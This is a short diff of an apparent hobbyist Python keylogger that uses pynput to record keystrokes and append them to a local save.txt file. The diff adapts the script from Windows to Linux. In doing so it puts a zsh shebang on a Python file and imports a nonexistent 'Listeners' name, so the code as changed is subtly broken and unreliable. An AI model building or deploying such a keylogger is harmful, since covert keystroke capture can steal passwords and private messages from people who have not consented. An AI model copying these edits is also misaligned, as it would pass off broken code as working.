@@ -1,8 +1,8 @@
-#! python3
+#!/bin/zsh
 # Description: Logs keystrokes and saves them in a text file.
 
 import pynput
-from pynput.keyboard import Key, Listener
+from pynput.keyboard import Key, Listeners
 
 count = 0
 keys = []
@@ -24,7 +24,7 @@ def save(keys):
     '''
     Saves the key presses to a save.txt file.
     '''
-    with open(r"C:\Users\Flores\Joey-Repositories\Python-Projects\completed\keylogger\save.txt", "a") as file:
+    with open("/home/joey/Joey-Repositories/Python-Projects/completed/keylogger/save.txt", "a") as file:
         for key in keys:
             key = str(key).replace("'", "")
             if key.find("space") > 0:
